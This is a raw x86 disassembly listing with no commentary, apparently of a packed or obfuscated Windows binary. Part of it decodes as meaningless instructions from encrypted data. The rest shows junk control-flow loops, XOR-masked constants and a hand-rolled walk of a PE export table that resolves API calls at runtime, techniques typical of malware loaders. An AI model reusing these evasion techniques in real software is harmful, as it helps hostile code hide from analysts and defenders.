  407ef1:	outs   dx,BYTE PTR ds:[esi]
  407ef2:	add    BYTE PTR ds:0x8009dea6,dl
  407ef8:	or     ebp,eax
  407efa:	mov    esi,0xc4951753
  407eff:	xchg   ebx,eax
  407f00:	loopne 0x407f5d
  407f02:	push   ds
  407f03:	pusha  
  407f04:	outs   dx,DWORD PTR ds:[esi]
  407f05:	cmp    al,0x91
  407f07:	jmp    0x407f82
  407f09:	mov    eax,0x8ef639cc
  407f0e:	jbe    0x407f8d
  407f10:	js     0x407edf
  407f12:	stos   DWORD PTR es:[edi],eax
  407f13:	in     eax,dx
  407f14:	mov    ebx,0xaa49105e
  407f19:	jo     0x407f14
  407f1b:	int    0xd5
  407f1d:	xchg   ecx,ecx
  407f1f:	add    esp,ebp
  407f21:	bound  edx,QWORD PTR [edi+0x6c]
  407f24:	add    al,0x33
  407f26:	fiadd  WORD PTR [edi+0x3d]
  407f29:	sub    eax,0xa49d0b1b
  407f2e:	fnsave [ebx]
  407f30:	mov    esp,0x2616c5a1
  407f35:	leave  
  407f36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f37:	mov    ah,0x5e
  407f39:	out    0x6a,eax
  407f3b:	jns    0x407ec0
  407f3d:	adc    dh,ah
  407f3f:	push   ebx
  407f40:	sub    BYTE PTR [edi-0x55072c5c],0xa1
  407f47:	jmp    0x407f20
  407f49:	pop    ds
  407f4a:	hlt    
  407f4b:	out    dx,eax
  407f4c:	dec    edi
  407f4d:	repz adc DWORD PTR [eax],eax
  407f50:	stos   BYTE PTR es:[edi],al
  407f51:	and    al,0x12
  407f53:	push   esp
  407f54:	in     al,dx
  407f55:	test   eax,0x4fb20d85
  407f5a:	in     al,dx
  407f5b:	xchg   edi,eax
  407f5c:	push   esi
  407f5d:	sbb    eax,0x55f910fe
  407f62:	cwde   
  407f63:	cld    
  407f64:	jb     0x407fae
  407f66:	push   ebx
  407f67:	add    eax,0xf9b8be9e
  407f6c:	mov    ecx,0xedd178c5
  407f71:	aam    0x2
  407f73:	sbb    DWORD PTR [edx+0x7f472856],0x20ae3271
  407f7d:	in     al,0xac
  407f7f:	sbb    BYTE PTR [ebx+edx*8+0x48],0x90
  407f84:	adc    DWORD PTR [ebx+0x2d],ebp
  407f87:	dec    ebp
  407f88:	xor    esi,ebx
  407f8a:	xchg   ebx,eax
  407f8b:	mov    ds:0x9fdec4ca,al
  407f90:	dec    ecx
  407f91:	fidiv  DWORD PTR [esp+edx*2+0x242e3f7f]
  407f98:	dec    ecx
  407f99:	ds inc ecx
  407f9b:	xchg   esi,eax
  407f9c:	push   edx
  407f9d:	mov    DWORD PTR [edx-0x28],esp
  407fa0:	ins    BYTE PTR es:[edi],dx
  407fa1:	xor    ch,0x5f
  407fa4:	aam    0x7b
  407fa6:	clc    
  407fa7:	jge    0x407f90
  407fa9:	stos   BYTE PTR es:[edi],al
  407faa:	scas   eax,DWORD PTR es:[edi]
  407fab:	inc    esp
  407fac:	repnz es xor eax,0x9fbdaba6
  407fb3:	js     0x407f62
  407fb5:	pop    ebx
  407fb6:	adc    ebx,edi
  407fb8:	push   ss
  407fb9:	xchg   DWORD PTR [ebp-0x20],edi
  407fbc:	dec    esi
  407fbd:	sub    cl,BYTE PTR ds:0xd1906485
  407fc3:	arpl   WORD PTR [esi],ax
  407fc5:	ffreep st(0)
  407fc7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407fc8:	ds dec ebx
  407fca:	(bad)  
  407fcb:	aaa    
  407fcc:	xchg   esi,eax
  407fcd:	out    0xbd,al
  407fcf:	out    0x22,al
  407fd1:	mul    BYTE PTR [esi-0x53]
  407fd4:	mov    esp,DWORD PTR [ecx+0x3b]
  407fd7:	lock and al,0x29
  407fda:	push   ebx
  407fdb:	outs   dx,DWORD PTR ds:[esi]
  407fdc:	sub    edx,DWORD PTR [ebx+eiz*1+0x1d4242ab]
  407fe3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407fe4:	sub    al,0x4b
  407fe6:	push   cs
  407fe7:	push   eax
  407fe8:	add    BYTE PTR [edi],0xb7
  407feb:	adc    BYTE PTR ds:0x2dd7945f,bl
  407ff1:	idiv   DWORD PTR [ecx]
  407ff3:	pop    ebp
  407ff4:	mov    ds:0xa4728c96,al
  407ff9:	inc    ebx
  407ffa:	test   eax,0x43c5fa4
  407fff:	jae    0x407fdf
  408001:	ds sahf 
  408003:	test   DWORD PTR [esi+ebx*8+0x72ba4e60],ecx
  40800a:	sub    DWORD PTR [esp+edi*2+0x5d3b4531],eax
  408011:	sbb    ecx,DWORD PTR [eax+0x39]
  408014:	mov    ebp,0x5d16d5f
  408019:	xchg   ebp,eax
  40801a:	cdq    
  40801b:	cmp    BYTE PTR [ecx-0x6942ba7a],dl
  408021:	mov    eax,ds:0xe5502fc
  408026:	or     al,BYTE PTR [ecx]
  408028:	ins    BYTE PTR es:[edi],dx
  408029:	daa    
  40802a:	lahf   
  40802b:	(bad)  
  40802c:	fsubrp st(6),st
  40802e:	(bad)  
  40802f:	jne    0x407fcd
  408031:	inc    ebx
  408032:	cmc    
  408033:	out    dx,al
  408034:	mov    edi,0x3b82f160
  408039:	mov    BYTE PTR [eax],dl
  40803b:	sub    ch,0xbb
  40803e:	mov    al,0x42
  408040:	aas    
  408041:	sub    edi,DWORD PTR [esi+ecx*8]
  408044:	jbe    0x407fdb
  408046:	addr16 loop 0x407ff7
  408049:	rol    ebx,0xf6
  40804c:	and    al,0xa2
  40804e:	aad    0x7b
  408050:	push   ebx
  408051:	push   ss
  408052:	mov    eax,ds:0x2e6941ff
  408057:	jbe    0x407ff1
  408059:	test   eax,0x59161423
  40805e:	sub    bl,BYTE PTR [ecx+0x68681726]
  408064:	sbb    eax,0xb35f333e
  408069:	sub    eax,0xbff2f35
  40806e:	nop
  40806f:	aas    
  408070:	ret    0xae91
  408073:	out    0xda,al
  408075:	xchg   ebp,eax
  408076:	xor    eax,0x1527f22b
  40807b:	add    ebx,edi
  40807d:	push   eax
  40807e:	lods   eax,DWORD PTR ds:[esi]
  40807f:	mov    ds:0x62b28d4a,al
  408084:	pop    ebp
  408085:	(bad)  
  408086:	dec    ebp
  408087:	push   0xffffff90
  408089:	js     0x4080e4
  40808b:	mov    edx,0x26105397
  408090:	xor    DWORD PTR [ecx+eax*4-0x3f],edx
  408094:	and    DWORD PTR [esi-0x62],edx
  408097:	push   ebx
  408098:	dec    esi
  408099:	mov    cs,WORD PTR [eax]
  40809b:	xchg   edi,eax
  40809c:	and    BYTE PTR [edi],dh
  40809e:	sub    al,0xdc
  4080a0:	cmp    eax,esi
  4080a2:	stc    
  4080a3:	in     eax,dx
  4080a4:	mov    esi,0x2ef9d6ba
  4080a9:	push   esi
  4080aa:	fs sub cl,ch
  4080ad:	mov    ds:0xe6b72367,eax
  4080b2:	(bad)  
  4080b3:	neg    esi
  4080b5:	pop    edx
  4080b6:	adc    edi,DWORD PTR [ecx]
  4080b8:	mov    es,WORD PTR [esi]
  4080ba:	add    dh,BYTE PTR [ebx+0x59]
  4080bd:	dec    eax
  4080be:	mov    ah,0xcf
  4080c0:	lar    ebp,WORD PTR [eax-0x7c535022]
  4080c7:	xor    esi,DWORD PTR [eax-0x6a49ba4]
  4080cd:	ds cmp eax,0xa7510bca
  4080d3:	or     eax,eax
  4080d5:	xlat   BYTE PTR ds:[ebx]
  4080d6:	xchg   edi,eax
  4080d7:	(bad)  
  4080d8:	in     al,0x5b
  4080da:	lock xor ch,BYTE PTR [eax+0x39127787]
  4080e1:	gs jbe 0x408150
  4080e4:	sbb    eax,0x1e76a3a1
  4080e9:	dec    edx
  4080ea:	in     eax,dx
  4080eb:	pop    ds
  4080ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4080ed:	sbb    BYTE PTR [ebx+0x29d038c7],dl
  4080f3:	jno    0x4080e2
  4080f5:	sub    bh,0xb1
  4080f8:	mov    esi,DWORD PTR [edx-0x3ad9da33]
  4080fe:	out    0x9d,eax
  408100:	sar    bh,0x76
  408103:	(bad)  
  408104:	nop
  408105:	shl    DWORD PTR [esi+0xad3760f],cl
  40810b:	std    
  40810c:	(bad)  
  40810d:	lods   eax,DWORD PTR ds:[esi]
  40810e:	test   BYTE PTR [ebp-0x2e30ec5c],ah
  408114:	xor    ah,al
  408116:	std    
  408117:	sbb    bl,BYTE PTR [esi]
  408119:	mov    cl,BYTE PTR [ebp+0xb6ee58d]
  40811f:	mov    al,0xe5
  408121:	sbb    edi,DWORD PTR [edx-0x73cb0486]
  408127:	fsubr  QWORD PTR ss:0x394ae6ff
  40812e:	out    0x7b,eax
  408130:	fisubr WORD PTR [ebp-0x1ccd3842]
  408136:	xchg   esp,eax
  408137:	and    al,0x3
  408139:	xchg   edx,eax
  40813a:	xchg   esp,eax
  40813b:	xor    bl,BYTE PTR [ebp+0xd]
  40813e:	fwait
  40813f:	mov    DWORD PTR [ebx],ebx
  408141:	scas   eax,DWORD PTR es:[edi]
  408142:	cmp    al,0x7
  408144:	xor    DWORD PTR [edx-0x2a45de65],ecx
  40814a:	add    dh,ch
  40814c:	push   esp
  40814d:	mov    esi,0x97363813
  408152:	inc    esp
  408153:	cmp    dl,BYTE PTR [ebp-0x502be113]
  408159:	(bad)  
  40815a:	push   ecx
  40815b:	xchg   esi,eax
  40815c:	in     al,0xc9
  40815e:	cmp    cl,BYTE PTR [ebx-0x3a]
  408161:	(bad)  
  408162:	jmp    DWORD PTR [edx-0x21ea23e7]
  408168:	xlat   BYTE PTR ds:[ebx]
  408169:	push   esp
  40816a:	out    0xc6,al
  40816c:	in     al,0x3
  40816e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40816f:	call   0x9a4a:0x7cf38e31
  408176:	sub    bl,BYTE PTR [ebx]
  408178:	inc    esi
  408179:	pop    ss
  40817a:	loopne 0x4081ab
  40817c:	push   edx
  40817d:	xchg   esi,eax
  40817e:	pop    eax
  40817f:	xlat   BYTE PTR ds:[ebx]
  408180:	lods   eax,DWORD PTR ds:[esi]
  408181:	nop
  408182:	push   eax
  408183:	in     eax,0x82
  408185:	mov    ecx,0xd2da674c
  40818a:	cmp    ah,BYTE PTR [ebx-0x517f31cb]
  408190:	shl    ah,0x24
  408193:	sar    bl,cl
  408195:	sar    BYTE PTR [eax],1
  408197:	lea    edi,[ebx+ebx*8+0x74]
  40819b:	bound  eax,QWORD PTR [edi+0x1c3d31ce]
  4081a1:	add    BYTE PTR [edx+0x0],0xbf
  4081a5:	pop    esp
  4081a6:	adc    eax,0xd72b0000
  4081ab:	and    DWORD PTR ds:0x42901c,0x60c1
  4081b5:	mov    ecx,DWORD PTR [ebp-0x4]
  4081b8:	xor    ecx,ebx
  4081ba:	and    DWORD PTR ds:0x42b014,0x0
  4081c4:	mov    esi,DWORD PTR ds:0x42b014
  4081ca:	inc    esi
  4081cb:	mov    DWORD PTR ds:0x42b014,esi
  4081d1:	cmp    DWORD PTR ds:0x42b014,0x10
  4081d8:	jne    0x4081e9
  4081de:	push   0x423542
  4081e3:	call   DWORD PTR ds:0x424044
  4081e9:	cmp    DWORD PTR ds:0x42b014,0xf
  4081f0:	jne    0x408203
  4081f6:	mov    esi,DWORD PTR ds:0x42b014
  4081fc:	inc    esi
  4081fd:	mov    DWORD PTR ds:0x42b014,esi
  408203:	cmp    DWORD PTR ds:0x42b014,0x1b
  40820a:	jb     0x4081c4
  408210:	add    ecx,eax
  408212:	sbb    esi,0x766b
  408218:	mov    DWORD PTR [ebp-0x8],ecx
  40821b:	and    esi,0x21f
  408221:	mov    ecx,DWORD PTR [ebp-0x14]
  408224:	mov    DWORD PTR ds:0x42b000,0x19
  40822e:	cmp    DWORD PTR ds:0x42b000,0x0
  408235:	je     0x40828f
  40823b:	cmp    DWORD PTR ds:0x42b000,0x4
  408242:	jne    0x40825b
  408248:	push   DWORD PTR [ebp-0x1c]
  40824b:	push   0x429018
  408250:	push   0x4237ae
  408255:	call   DWORD PTR ds:0x424048
  40825b:	cmp    DWORD PTR ds:0x42b000,0x5
  408262:	jne    0x408275
  408268:	mov    esi,DWORD PTR ds:0x42b000
  40826e:	dec    esi
  40826f:	mov    DWORD PTR ds:0x42b000,esi
  408275:	xor    esi,esi
  408277:	add    esi,DWORD PTR ds:0x42b000
  40827d:	dec    esi
  40827e:	mov    DWORD PTR ds:0x42b000,esi
  408284:	jmp    0x40822e
  408289:	and    esi,0x686c
  40828f:	xor    ecx,ebx
  408291:	add    ecx,eax
  408293:	mov    DWORD PTR [ebp-0x24],ecx
  408296:	adc    esi,ecx
  408298:	mov    ecx,DWORD PTR [ebp-0x4]
  40829b:	and    DWORD PTR ds:0x428014,0x0
  4082a5:	jmp    0x4082b7
  4082aa:	mov    esi,DWORD PTR ds:0x428014
  4082b0:	inc    esi
  4082b1:	mov    DWORD PTR ds:0x428014,esi
  4082b7:	cmp    DWORD PTR ds:0x428014,0x14
  4082be:	jae    0x4082ea
  4082c4:	cmp    DWORD PTR ds:0x428014,0x1d
  4082cb:	jne    0x4082df
  4082d1:	push   0x42b01c
  4082d6:	push   DWORD PTR [ebp-0xc]
  4082d9:	call   DWORD PTR ds:0x424014
  4082df:	jmp    0x4082aa
  4082e4:	xor    DWORD PTR ds:0x428018,ecx
  4082ea:	xor    ecx,ebx
  4082ec:	add    ecx,eax
  4082ee:	add    DWORD PTR ds:0x428004,edx
  4082f4:	mov    DWORD PTR [ebp-0x30],ecx
  4082f7:	adc    DWORD PTR ds:0x42b01c,edi
  4082fd:	mov    esi,DWORD PTR [ebp-0x4]
  408300:	xor    DWORD PTR ds:0x42800c,0x2f0f
  40830a:	xor    esi,ebx
  40830c:	and    DWORD PTR ds:0x429018,0x0
  408316:	mov    ecx,DWORD PTR ds:0x429018
  40831c:	inc    ecx
  40831d:	mov    DWORD PTR ds:0x429018,ecx
  408323:	cmp    DWORD PTR ds:0x429018,0x13
  40832a:	jne    0x408358
  408330:	push   DWORD PTR [ebp-0x18]
  408333:	push   0x42b018
  408338:	push   0x8bc1
  40833d:	push   0x42a018
  408342:	push   0x81c2
  408347:	push   DWORD PTR [ebp-0x18]
  40834a:	push   0x8630
  40834f:	push   DWORD PTR [ebp-0x28]
  408352:	call   DWORD PTR ds:0x424018
  408358:	cmp    DWORD PTR ds:0x429018,0x10
  40835f:	jb     0x408316
  408365:	movzx  ecx,WORD PTR ds:0x429008
  40836c:	sub    ecx,DWORD PTR ds:0x42a010
  408372:	mov    DWORD PTR ds:0x429008,ecx
  408378:	add    esi,eax
  40837a:	mov    ecx,DWORD PTR [ebp-0x24]
  40837d:	sub    ecx,eax
  40837f:	lea    edx,[esi-0x3272db]
  408385:	xor    DWORD PTR ds:0x428008,0x428000
  40838f:	xor    ecx,ebx
  408391:	sub    DWORD PTR ds:0x42c01c,0x42b01c
  40839b:	xor    edx,ebx
  40839d:	cmp    edx,ecx
  40839f:	mov    DWORD PTR ds:0x428000,0x76f
  4083a9:	je     0x408631
  4083af:	xor    DWORD PTR ds:0x42c010,edx
  4083b5:	mov    ecx,DWORD PTR [ebp-0x4]
  4083b8:	xor    ecx,ebx
  4083ba:	or     DWORD PTR ds:0x429014,0x42a01c
  4083c4:	add    ecx,eax
  4083c6:	cmp    esi,ecx
  4083c8:	mov    DWORD PTR ds:0x42a01c,0x739d
  4083d2:	jne    0x40860e
  4083d8:	add    DWORD PTR ds:0x42a00c,0x429004
  4083e2:	push   DWORD PTR [ebp+0x8]
  4083e5:	call   0x408a39
  4083ea:	mov    DWORD PTR [ebp-0x18],eax
  4083ed:	mov    eax,DWORD PTR [ebp-0x4]
  4083f0:	mov    DWORD PTR ds:0x42c00c,0x1d
  4083fa:	cmp    DWORD PTR ds:0x42c00c,0x0
  408401:	je     0x408435
  408407:	cmp    DWORD PTR ds:0x42c00c,0x21
  40840e:	jne    0x40841d
  408414:	push   DWORD PTR [ebp-0xc]
  408417:	call   DWORD PTR ds:0x42401c
  40841d:	mov    edi,DWORD PTR ds:0x42c00c
  408423:	dec    edi
  408424:	mov    DWORD PTR ds:0x42c00c,edi
  40842a:	jmp    0x4083fa
  40842f:	adc    ecx,DWORD PTR ds:0x428008
  408435:	mov    ecx,DWORD PTR [ebp-0x18]
  408438:	and    DWORD PTR ds:0x42b01c,0x0
  408442:	mov    edi,DWORD PTR ds:0x42b01c
  408448:	inc    edi
  408449:	mov    DWORD PTR ds:0x42b01c,edi
  40844f:	cmp    DWORD PTR ds:0x42b01c,0x23
  408456:	jne    0x408468
  40845c:	push   DWORD PTR [ebp-0x14]
  40845f:	push   DWORD PTR [ebp-0x28]
  408462:	call   DWORD PTR ds:0x424020
  408468:	cmp    DWORD PTR ds:0x42b01c,0x19
  40846f:	jb     0x408442
  408475:	xor    eax,ebx
  408477:	add    DWORD PTR ds:0x429018,0x397c
  408481:	mov    edi,0x3272db
  408486:	sub    DWORD PTR ds:0x428020,0x386b
  408490:	add    eax,edi
  408492:	mov    DWORD PTR ds:0x42900c,0x67dc
  40849c:	cmp    ecx,eax
  40849e:	mov    DWORD PTR ds:0x42c00c,0x661b
  4084a8:	je     0x4086a1
  4084ae:	push   DWORD PTR [ebp-0x18]
  4084b1:	sub    DWORD PTR ds:0x42800c,0x42a014
  4084bb:	push   DWORD PTR [ebp+0x8]
  4084be:	and    DWORD PTR ds:0x42b000,0x429010
  4084c8:	call   0x419246
  4084cd:	sub    ecx,DWORD PTR ds:0x42a00c
  4084d3:	mov    DWORD PTR [ebp-0x18],eax
  4084d6:	xor    eax,eax
  4084d8:	xor    eax,DWORD PTR ds:0x42a01c
  4084de:	xor    DWORD PTR ds:0x428018,eax
  4084e4:	mov    eax,DWORD PTR [ebp-0x4]
  4084e7:	mov    ecx,DWORD PTR [ebp-0x18]
  4084ea:	xor    eax,ebx
  4084ec:	add    eax,edi
  4084ee:	cmp    ecx,eax
  4084f0:	je     0x4086a1
  4084f6:	mov    ecx,DWORD PTR ds:0x429010
  4084fc:	add    DWORD PTR ds:0x42a010,ecx
  408502:	mov    eax,DWORD PTR [ebp-0x18]
  408505:	and    DWORD PTR ds:0x42a008,0x0
  40850f:	jmp    0x408521
  408514:	mov    ecx,DWORD PTR ds:0x42a008
  40851a:	inc    ecx
  40851b:	mov    DWORD PTR ds:0x42a008,ecx
  408521:	cmp    DWORD PTR ds:0x42a008,0x14
  408528:	jae    0x4085ac
  40852e:	cmp    DWORD PTR ds:0x42a008,0x1f
  408535:	jne    0x408563
  40853b:	push   0x42b010
  408540:	push   DWORD PTR [ebp-0x10]
  408543:	push   0x4f72
  408548:	push   0x42900c
  40854d:	push   DWORD PTR [ebp-0x24]
  408550:	push   0x4236ce
  408555:	push   DWORD PTR [ebp-0x1c]
  408558:	push   0x3544
  40855d:	call   DWORD PTR ds:0x424024
  408563:	jmp    0x408514
  408568:	and    DWORD PTR ds:0x428020,0x0
  408572:	mov    ecx,DWORD PTR ds:0x428020
  408578:	inc    ecx
  408579:	mov    DWORD PTR ds:0x428020,ecx
  40857f:	cmp    DWORD PTR ds:0x428020,0x1a
  408586:	jne    0x40859f
  40858c:	push   DWORD PTR [ebp-0x1c]
  40858f:	push   0x561b
  408594:	push   0x3276
  408599:	call   DWORD PTR ds:0x424028
  40859f:	cmp    DWORD PTR ds:0x428020,0x17
  4085a6:	jb     0x408572
  4085ac:	mov    eax,DWORD PTR [eax+0x18]
  4085af:	mov    DWORD PTR [ebp-0x24],eax
  4085b2:	xor    eax,eax
  4085b4:	mov    eax,DWORD PTR [ebp-0x18]
  4085b7:	mov    ecx,DWORD PTR [ebp+0x8]
  4085ba:	add    DWORD PTR ds:0x42901c,0x480
  4085c4:	add    ecx,DWORD PTR [eax+0x20]
  4085c7:	mov    DWORD PTR [ebp-0x2c],ecx
  4085ca:	sub    DWORD PTR ds:0x42c00c,ebx
  4085d0:	mov    eax,DWORD PTR [ebp-0x18]
  4085d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4085d6:	add    DWORD PTR ds:0x42a004,0x42a01c
  4085e0:	add    ecx,DWORD PTR [eax+0x24]
  4085e3:	mov    DWORD PTR [ebp-0x34],ecx
  4085e6:	inc    ecx
  4085e7:	mov    eax,DWORD PTR [ebp-0x18]
  4085ea:	sub    DWORD PTR ds:0x42b010,0x20b8
  4085f4:	mov    ecx,DWORD PTR [ebp+0x8]
  4085f7:	or     DWORD PTR ds:0x42a010,0x1874
  408601:	add    ecx,DWORD PTR [eax+0x1c]
  408604:	mov    eax,edi
  408606:	mov    DWORD PTR [ebp-0x18],ecx
  408609:	jmp    0x408669
  40860e:	mov    ecx,DWORD PTR [ebp-0x2c]
  408611:	mov    edx,DWORD PTR [ebp+0x8]
  408614:	add    edx,DWORD PTR [ecx+esi*4]
  408617:	mov    DWORD PTR [ebp-0x28],edx
  40861a:	mov    ecx,DWORD PTR [ebp-0x4]
  40861d:	mov    edx,DWORD PTR [ebp-0x28]
  408620:	xor    ecx,ebx
  408622:	add    ecx,eax
  408624:	cmp    edx,ecx
  408626:	je     0x408669
  40862c:	jmp    0x408655
  408631:	mov    ecx,DWORD PTR [ebp-0x4]
  408634:	mov    edx,DWORD PTR [ebp-0x8]
  408637:	xor    ecx,ebx
  408639:	add    ecx,eax
  40863b:	cmp    edx,ecx
  40863d:	je     0x4086ad
  408643:	mov    ecx,DWORD PTR [ebp-0x4]
  408646:	mov    edx,DWORD PTR [ebp-0x30]
  408649:	xor    ecx,ebx
  40864b:	add    ecx,eax
  40864d:	cmp    edx,ecx
  40864f:	je     0x4086bc
  408655:	lea    eax,[ebp-0x8]
  408658:	push   eax
  408659:	push   DWORD PTR [ebp-0x28]
  40865c:	push   DWORD PTR [ebp+0xc]
  40865f:	call   0x419e00
  408664:	mov    eax,0x3272db
  408669:	mov    ecx,DWORD PTR [ebp-0x4]
  40866c:	mov    edx,DWORD PTR [ebp-0x8]
  40866f:	xor    ecx,ebx
  408671:	add    ecx,eax
  408673:	cmp    edx,ecx
  408675:	je     0x408690
  40867b:	mov    ecx,DWORD PTR [ebp-0x34]
  40867e:	movzx  ecx,WORD PTR [ecx+esi*2]
  408682:	mov    edx,DWORD PTR [ebp-0x18]
  408685:	mov    ecx,DWORD PTR [edx+ecx*4]
  408688:	mov    DWORD PTR [ebp-0x38],ecx
  40868b:	jmp    0x408631
  408690:	mov    ecx,DWORD PTR [ebp-0x14]
  408693:	xor    ecx,ebx
  408695:	lea    esi,[esi+ecx*1+0x3272db]
  40869c:	jmp    0x40837a
  4086a1:	mov    eax,DWORD PTR [ebp-0x4]
  4086a4:	xor    eax,ebx
  4086a6:	add    eax,edi
  4086a8:	jmp    0x408820
  4086ad:	mov    eax,DWORD PTR [ebp-0x4]
  4086b0:	xor    eax,ebx
  4086b2:	add    eax,0x3272db
  4086b7:	jmp    0x408820
  4086bc:	mov    ecx,DWORD PTR [ebp-0x38]
  4086bf:	add    ecx,DWORD PTR [ebp+0x8]
  4086c2:	mov    DWORD PTR [ebp-0x10],ecx
  4086c5:	mov    ecx,DWORD PTR [ebp-0x1c]
  4086c8:	test   ecx,ecx
  4086ca:	je     0x4087ab
  4086d0:	mov    DWORD PTR [ebp-0x20],0x0
  4086d7:	push   0x3
  4086d9:	xor    edx,edx
  4086db:	pop    edx
  4086dc:	add    edx,0x8
  4086df:	push   edx
  4086e0:	pop    ecx
  4086e1:	push   0x6
  4086e3:	dec    ecx
  4086e4:	pop    ebx
  4086e5:	dec    ebx
  4086e6:	xchg   ebx,ecx
  4086e8:	sub    ebx,ecx
  4086ea:	xchg   ebx,ecx
  4086ec:	dec    ecx
  4086ed:	mov    eax,DWORD PTR [ebp-0x1c]
  4086f0:	imul   eax,ecx
  4086f3:	sub    esp,eax
  4086f5:	mov    DWORD PTR [ebp-0x20],esp
  4086f8:	mov    eax,DWORD PTR [ebp-0x4]
  4086fb:	mov    ecx,0x7510893
  408700:	xor    eax,ecx
  408702:	mov    edx,0x3272db
  408707:	add    eax,edx
  408709:	mov    DWORD PTR [ebp+0x8],eax
  40870c:	mov    eax,DWORD PTR [ebp-0x14]
  40870f:	xor    eax,ecx
  408711:	add    eax,edx
  408713:	mov    edx,DWORD PTR [ebp+0x14]
  408716:	imul   eax,DWORD PTR [edx]
  408719:	mov    edx,DWORD PTR [ebp-0x4]
  40871c:	xor    edx,ecx
  40871e:	mov    ecx,DWORD PTR [ebp+0x8]
  408721:	lea    ecx,[edx+ecx*1+0x3272db]
  408728:	cmp    ecx,eax
  40872a:	je     0x4087a1
  408730:	mov    edi,DWORD PTR [ebp-0x14]
  408733:	mov    eax,DWORD PTR [ebp+0x8]
  408736:	mov    edx,DWORD PTR [ebp+0x14]
  408739:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40873d:	mov    ecx,0x7510893
  408742:	xor    edx,edx
  408744:	xor    edi,ecx
  408746:	mov    esi,0x3272db
  40874b:	add    edi,esi
  40874d:	div    edi
  40874f:	mov    edx,DWORD PTR [ebp-0x4]
  408752:	xor    edx,ecx
  408754:	lea    eax,[edx+eax*1+0x3272db]
  40875b:	mov    edx,DWORD PTR [ebp+0x8]
  40875e:	mov    edi,DWORD PTR [ebp-0x20]
  408761:	mov    DWORD PTR [edi+edx*4],eax
  408764:	mov    eax,DWORD PTR [ebp-0x14]
  408767:	mov    edx,DWORD PTR [ebp+0x8]
  40876a:	xor    eax,ecx
  40876c:	lea    eax,[eax+edx*1+0x3272db]
  408773:	mov    DWORD PTR [ebp+0x8],eax
  408776:	mov    eax,DWORD PTR [ebp-0x14]
  408779:	mov    edx,DWORD PTR [ebp+0x14]
  40877c:	xor    eax,ecx
  40877e:	add    eax,esi
  408780:	imul   eax,DWORD PTR [edx]
  408783:	mov    edx,DWORD PTR [ebp-0x4]
  408786:	xor    edx,ecx
  408788:	mov    ecx,DWORD PTR [ebp+0x8]
  40878b:	lea    ecx,[edx+ecx*1+0x3272db]
  408792:	cmp    ecx,eax
  408794:	jne    0x408730
  40879a:	mov    eax,esi
  40879c:	jmp    0x4087a6
  4087a1:	mov    eax,0x3272db
  4087a6:	mov    ebx,0x7510893
  4087ab:	mov    ecx,DWORD PTR [ebp-0x4]
  4087ae:	xor    ecx,ebx
  4087b0:	add    ecx,eax
  4087b2:	mov    DWORD PTR [ebp-0xc],ecx
  4087b5:	mov    ebx,0x3874
  4087ba:	add    ebx,0x2342
  4087c0:	xchg   ebx,esi
  4087c2:	xor    ebx,ebx
  4087c4:	push   esi
  4087c5:	mov    esi,ebx
  4087c7:	pop    ebx
  4087c8:	mov    edx,esi
  4087ca:	add    ebx,0x1002
  4087d0:	lea    eax,[ebp-0x10]
  4087d3:	add    edx,eax
  4087d5:	add    edx,0x5
  4087d8:	push   edx
  4087d9:	inc    esi
  4087da:	pop    ecx
  4087db:	dec    ecx
  4087dc:	xchg   ecx,eax
  4087dd:	dec    eax
  4087de:	xchg   ecx,eax
  4087df:	dec    ecx
  4087e0:	xchg   ecx,edx
  4087e2:	dec    edx
  4087e3:	push   edx
  4087e4:	mov    edx,ebx
  4087e6:	pop    ebx
  4087e7:	dec    ebx
  4087e8:	call   DWORD PTR [ebx]
  4087ea:	cmp    DWORD PTR [ebp+0x10],esi
  4087ed:	je     0x40880c
  4087f3:	xchg   edx,eax
  4087f4:	push   0xb
  4087f6:	pop    ecx
  4087f7:	push   0x4
  4087f9:	pop    ebx
  4087fa:	inc    ebx
  4087fb:	xchg   ebx,ecx
  4087fd:	sub    ebx,ecx
  4087ff:	xchg   ebx,ecx
  408801:	dec    ecx
  408802:	dec    ecx
  408803:	mov    eax,DWORD PTR [ebp-0x1c]
  408806:	imul   eax,ecx
  408809:	add    esp,eax
  40880b:	xchg   edx,eax
  40880c:	push   eax
  40880d:	xor    ebx,ebx
  40880f:	mov    edx,esp
  408811:	dec    edx
  408812:	inc    ebx
  408813:	add    ebx,DWORD PTR [edx+ebx*1]
  408816:	dec    ebx
  408817:	xor    edx,edx
  408819:	add    DWORD PTR [ebp-0xc],ebx
  40881c:	pop    ebx
  40881d:	mov    eax,DWORD PTR [ebp-0xc]
  408820:	pop    edi
  408821:	pop    esi
  408822:	pop    ebx
  408823:	leave  
  408824:	ret    0x10
  408827:	or     DWORD PTR ds:0x42c00c,0x42a008
  408831:	xor    eax,eax
  408833:	add    DWORD PTR ds:0x428028,0x42a010
  40883d:	inc    eax
  40883e:	ret    
  40883f:	push   ebp
  408840:	mov    ebp,esp
  408842:	mov    eax,ds:0x421922
  408847:	and    DWORD PTR ds:0x42c008,0x0
  408851:	xor    ecx,ecx
  408853:	or     ecx,DWORD PTR ds:0x42c008
  408859:	inc    ecx
  40885a:	mov    DWORD PTR ds:0x42c008,ecx
  408860:	cmp    DWORD PTR ds:0x42c008,0xc
  408867:	jne    0x40887d
  40886d:	push   0x4235a6
  408872:	push   0x42355e
  408877:	call   DWORD PTR ds:0x424030
  40887d:	cmp    DWORD PTR ds:0x42c008,0xb
  408884:	jne    0x408897
  40888a:	mov    ecx,DWORD PTR ds:0x42c008
  408890:	inc    ecx
  408891:	mov    DWORD PTR ds:0x42c008,ecx
  408897:	cmp    DWORD PTR ds:0x42c008,0x1b
  40889e:	jb     0x408851
  4088a4:	xor    ecx,DWORD PTR ds:0x42a01c
  4088aa:	mov    eax,DWORD PTR [eax+0x1c8]
  4088b0:	add    ecx,0x4e81
  4088b6:	mov    eax,DWORD PTR [eax]
  4088b8:	and    ecx,DWORD PTR ds:0x42b018
  4088be:	cdq    
  4088bf:	push   ebx
  4088c0:	mov    ecx,0xfabdbef1
  4088c5:	add    ebx,0x1541
  4088cb:	add    eax,ecx
  4088cd:	adc    edx,0xffffffff
  4088d0:	push   esi
  4088d1:	push   edi
  4088d2:	mov    edi,DWORD PTR ds:0x421742
  4088d8:	mov    ebx,DWORD PTR ds:0x42176a
